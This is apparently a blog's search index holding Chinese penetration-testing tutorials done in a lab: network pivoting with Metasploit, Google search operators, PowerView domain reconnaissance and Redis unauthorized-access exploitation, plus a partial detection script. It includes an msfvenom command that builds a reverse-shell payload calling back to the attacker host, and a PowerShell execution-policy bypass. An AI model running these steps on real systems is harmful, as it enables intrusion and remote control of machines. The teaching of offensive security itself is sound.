<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Pivoting跳板攻击与自动路由</title>
    <url>/2021/03/21/Pivoting%E8%B7%B3%E6%9D%BF%E6%94%BB%E5%87%BB%E4%B8%8E%E8%87%AA%E5%8A%A8%E8%B7%AF%E7%94%B1/</url>
    <content><![CDATA[<h2 id="网络拓扑图及通信原理"><a href="#网络拓扑图及通信原理" class="headerlink" title="网络拓扑图及通信原理"></a>网络拓扑图及通信原理</h2><p>我们现在假若得到了<code>192.168.103.101</code>的主机权限，但是我们经过收集信息发现只有该win7主机是出网的，里面还有一个网段的主机不出网，那么这时我们就要使用跳板攻击的方式访问到不出网的主机。这里我们假设出网的网段为<code>192.168.103.0/24</code>，不出网的数据库主机所处网段为<code>192.168.104.0/24</code>，我们在vmware上分别设置好这两个网段。<br><img src="https://img-blog.csdnimg.cn/20210321120638928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>vmnet2之前上一章已经配置完成，vmnet3设置DHCP配置<br><img src="https://img-blog.csdnimg.cn/20210321121040583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<span id="more"></span>
<p><strong>win7</strong><br><img src="https://img-blog.csdnimg.cn/20210321121411556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>windows server2003</strong><br><img src="https://img-blog.csdnimg.cn/20210321121359809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<!--more-->
<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>现在我们在kali上生成一个木马文件，然后使用win7下载到本机上，使用管理员的权限运行该文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.101.63(这是kali的NAT映射到外网的IP) lport=4444 -b <span class="string">&quot;\x00\xff&quot;</span> -a x86 --platform windows -e x86/shikata_ga_nai -f exe &gt; msf.exe</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210321121742286.png" alt="在这里插入图片描述"><br>然后在kali上开启一个HTTP服务，使用win7下载到本机上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 4444</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210321122221783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>kali上使用<code>windows/meterpreter/reverse_tcp</code>这个漏洞利用模块，其他操作不再赘述<br><img src="https://img-blog.csdnimg.cn/20210321122504738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进一步提权<br><img src="https://img-blog.csdnimg.cn/20210321122804150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们在meterpreter上使用<code>ipconfig</code>这个命令时，发现了两个网段的IP地址，初步判断有可能是内网敏感数据所处的IP网段<br><img src="https://img-blog.csdnimg.cn/20210321122928633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/202103211229485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不说废话，立马开干！首先使用<code>post/windows/gather/arp_scanner</code>模块对内网信息进行收集<br><img src="https://img-blog.csdnimg.cn/20210321123103614.png" alt="在这里插入图片描述"><br>然后使用自动路由的方式，将<code>192.168.104.0/24</code>这个网段添加到路由表中<br><img src="https://img-blog.csdnimg.cn/20210321123256486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后将会话拉入后台中，接着我们使用<code>auxiliary/scanner/portscan/tcp</code>这个模块扫描主机开放了哪些端口和服务。这里我们就选了几个常用的端口<br><img src="https://img-blog.csdnimg.cn/20210321123522805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>收集完成！<br><img src="https://img-blog.csdnimg.cn/2021032112354091.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>红蓝对抗</tag>
      </tags>
  </entry>
  <entry>
    <title>Google高级运算符</title>
    <url>/2021/03/21/Google%E9%AB%98%E7%BA%A7%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
    <content><![CDATA[<h2 id="高级运算符"><a href="#高级运算符" class="headerlink" title="高级运算符"></a>高级运算符</h2><blockquote>
<p><strong>intitle后面的单词或短语被认为是搜索项</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210319235150904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<span id="more"></span>
<blockquote>
<p><strong>allintitle告诉Google它后面的每一个单词或短语都要在页面标题中被找到</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210319235407710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>allintext：在一个网页的文本中找到一个搜索项，但是这个运算符不应该和别的高级运算符混用</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210319235846651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>inurl：在文档的URL里找到单词admin，在整篇文档任意位置找到单词index</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210320000716816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>site：允许你搜索仅仅位于一个特定服务器上的或在一个特定域名里的页面</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2021032116214940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<!--more-->

<blockquote>
<p><strong>filetype：该运算符能够用来搜索特殊类型的文件</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210321162557534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>link:搜索一个网页的链接</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210321163139593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>inanchor：在链接文本中寻找文本</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210321163341526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>numrange：搜索一个数字</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210321164706426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>cache：显示页面缓存版本</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210321164920742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>daterange：搜索在特定日期范围内发布的页面</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210321165052552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>info：显示Google的总结信息</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210321165200652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>related：显示相关站点，与一个网站相关的站点</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210321165300413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>stocks：搜索股票信息</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210321165517489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>define：显示一个术语的定义</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210321165611804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Google</category>
      </categories>
      <tags>
        <tag>Google hacking</tag>
      </tags>
  </entry>
  <entry>
    <title>Powershell收集域内信息</title>
    <url>/2021/03/06/Powershell%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Powershell作为微软官方推出的脚本语言，在Windows操作系统中的强大功能总所周知：系统管理员可以利用它提高Windows管理工作的自动化程度；渗透测试人员可以利用它更好地进行系统安全测试。因为powershell命令比较安全，减少了触发IDS或IPS的风险，因此大多数的作用是用于绕过策略。</p>
<blockquote>
<p><strong>Powershell的常用执行权限共有四种</strong></p>
</blockquote>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Restricted</td>
<td>默认设置，不允许执行任何脚本</td>
</tr>
<tr>
<td>Allsigned</td>
<td>只能运行经过证书验证的脚本</td>
</tr>
<tr>
<td>Unrestricted</td>
<td>权限最高，可以执行任意脚本</td>
</tr>
<tr>
<td>RemoteSigned</td>
<td>对本地脚本不进行限制；对来自网络的脚本必须验证其签名</td>
</tr>
</tbody></table>
<span id="more"></span>
<h2 id="各脚本命令展示"><a href="#各脚本命令展示" class="headerlink" title="各脚本命令展示"></a>各脚本命令展示</h2><p>这里我们将策略设置为Unrestricted，能运行所有的脚本权限<br><img src="https://img-blog.csdnimg.cn/20210306133134774.png" alt="在这里插入图片描述"><br>然后我们进入PowerSploit的Recon文件夹将PowerView.ps1这个脚本导入进去(只有导入这个脚本才能执行以下命令)，这个是PowerSploit的下载地址</p>
<p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a><br><img src="https://img-blog.csdnimg.cn/20210306133704948.png" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>Get-NetDomain：获取当前用户所在域的名称</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210306133824783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>Get-NetUser：获取所有用户的详细信息</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210306134143467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>Get-NetDomainController：获取所有域控制器的信息</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210306134253861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>Get-NetComputer：获取域内所有机器的详细信息</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2021030613443370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>Get-NetOU：获取域中的OU信息</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210306134535643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021030613454718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>Get-NetGroup：获取所有域内组和组成员的信息</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2021030613464591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>Get-NetShare：获取当前域内所有的网络共享信息</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210306134857127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>Get-NetSession：获取指定服务器的对话</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210306135028467.png" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>Get-NetRDPSession：获取指定服务器的远程连接</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210306135144213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>Get-NetProcess：获取远程主机的进程</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210306135251953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>Get-UserEvent：获取指定用户的日志</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210306135349272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>Get-ADObject：获取活动目录的对象</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2021030613552975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>Get-NetGPO：获取域内所有的组策略对象</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210306135710375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>Get-DomainPolicy：获取域默认策略或域控制器策略</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210306135819950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>Invoke-UserHunter：获取域用户登录的计算机信息及该用户是否有本地管理员权限</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210306140014762.png" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>Invoke-ProcessHunter：通过查询域内所有的机器进程找到特定用户</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2021030614015675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Powershell脚本绕过策略实例"><a href="#Powershell脚本绕过策略实例" class="headerlink" title="Powershell脚本绕过策略实例"></a>Powershell脚本绕过策略实例</h2><p>首先我们先将策略更改为Restricted，默认不能执行任何脚本<br><img src="https://img-blog.csdnimg.cn/20210306140851647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>执行绕过后，命令成功执行，<code>powershell -exec bypass &quot;import-module&quot; 脚本路径；执行的命令</code><br><img src="https://img-blog.csdnimg.cn/20210306140929449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>红蓝对抗</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis未授权访问漏洞</title>
    <url>/2021/02/24/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>Redis是一种使用ANSIC语言编写的开源Key-Value型数据库。Redis为了保证效率，将数据缓存在内存中，周期性地把更新的数据写入磁盘或者把修改操作写入追加的记录文件中，在此基础上实现了master-slave(主从)同步。</p>
<p>对Redis配置不当将会导致未授权访问漏洞，从而被攻击者恶意利用。如果Redis以root身份运行，攻击者可以用root权限写入SSH公钥文件，通过SSH登录目标服务器，进而导致服务器权限被获取、泄露或发生加密勒索事件，为正常服务带来严重危害。</p>
<span id="more"></span>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>漏洞利用的方式有很多，这里我们介绍其中的一种——<code>利用公私钥认证获取ROOT权限</code></strong><br>首先我们先在靶机上以root身份启动redis服务，命令为<code>redis-server /etc/redis.conf</code>，安装redis请读者上网查阅资料，这里只讲述攻击方法<br><img src="https://img-blog.csdnimg.cn/20210214204941377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><!--more--><br>然后我们在kali上生成一个ssh空密钥<br><img src="https://img-blog.csdnimg.cn/2021021420510262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入/root/.ssh目录下查看生成结果，并将公钥导入到txt文件中<br><img src="https://img-blog.csdnimg.cn/20210214205318550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将txt文件中的公钥导入Redis缓存中<br><img src="https://img-blog.csdnimg.cn/20210214205411588.png" alt="在这里插入图片描述"><br>连接目标主机，更改配置文件路径为/root/.ssh，设定文件名称为authorized-keys<br><img src="https://img-blog.csdnimg.cn/2021021420553631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>通过SSH协议连接到远程目标主机<br><img src="https://img-blog.csdnimg.cn/20210214205628977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p>先编写程序的起始部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#程序起始部分</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        start(sys.argv[<span class="number">1</span>:])</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">&quot;interrupted by user, killing all threads...&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>然后编写命令行参数处理功能，<code>opts</code>为一个两元组列表，如果没有附加参数则为空串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#编写命令行参数处理功能</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">argv</span>):</span></span><br><span class="line">    <span class="built_in">dict</span> = &#123;&#125;</span><br><span class="line">    url = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">type</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&quot;-h 帮助信息; \n&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="comment">#定义异常处理</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        banner()</span><br><span class="line">        opts,args = getopt.getopt(argv, <span class="string">&quot;-u:-p:-s:-h&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError:</span><br><span class="line">        print(<span class="string">&#x27;Error an argument!&#x27;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">for</span> opt,arg <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> opt == <span class="string">&quot;-u&quot;</span>:</span><br><span class="line">            url = arg</span><br><span class="line">        <span class="keyword">elif</span> opt == <span class="string">&quot;-s&quot;</span>:</span><br><span class="line">            <span class="built_in">type</span> = arg</span><br><span class="line">        <span class="keyword">elif</span> opt == <span class="string">&quot;-p&quot;</span>:</span><br><span class="line">            port = arg</span><br><span class="line">        <span class="keyword">elif</span> opt == <span class="string">&quot;-h&quot;</span>:</span><br><span class="line">            print(usage())</span><br><span class="line">    launcher(url,<span class="built_in">type</span>,port)</span><br></pre></td></tr></table></figure>
<p>编写帮助信息</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#banner信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;\033[1;34m########################################################################################\033[0m\n&#x27;</span></span><br><span class="line">          <span class="string">&#x27;\033[1;34m######################################\033[1;32mRedis未授权访问漏洞\033[1;34m####################################\033[0m\n&#x27;</span></span><br><span class="line">          <span class="string">&#x27;\033[1;34m########################################################################################\033[0m\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>接下来是Redis漏洞检测的核心代码，此处通过<code>socket函数</code>尝试连接远程主机的IP及端口号，发送payload字符串。利用<code>recvdata函数</code>接收目标主机返回的数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#未授权函数检测</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_unauthored</span>(<span class="params">url,port</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    s = socket.socket()</span><br><span class="line">    payload = <span class="string">&quot;\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a&quot;</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">            s.sendall(payload.encode())</span><br><span class="line">            recvdata = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">            <span class="keyword">if</span> recvdata <span class="keyword">and</span> <span class="string">&#x27;redis_version&#x27;</span> <span class="keyword">in</span> recvdata:</span><br><span class="line">                result.append(<span class="built_in">str</span>(ip)+<span class="string">&#x27;:&#x27;</span>+<span class="built_in">str</span>(port)+<span class="string">&#x27;:&#x27;</span>+<span 